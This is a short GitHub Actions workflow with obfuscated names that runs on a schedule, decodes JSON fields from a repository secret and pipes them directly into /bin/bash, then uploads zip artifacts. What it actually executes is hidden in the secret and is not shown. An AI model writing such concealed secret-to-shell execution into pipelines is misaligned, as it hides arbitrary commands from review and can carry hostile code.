name: zhengsonglianghe
on:
  workflow_dispatch:

  schedule:
    - cron: '54 2,8,14,20 * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: zhengsonglianghe
        env:
          uezz343: ${{ secrets.uezz343 }}
        run: |
          printf '%s' "$uezz343" | jq -r .t66974 | /bin/bash
          echo $oyx4 | jq -r .bdgju060 | /bin/bash
          printf '%s' "$vujbe5358" | jq -r .ipnl5379 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: AZANzvmB
          path: "*.zip"
          retention-days: 1
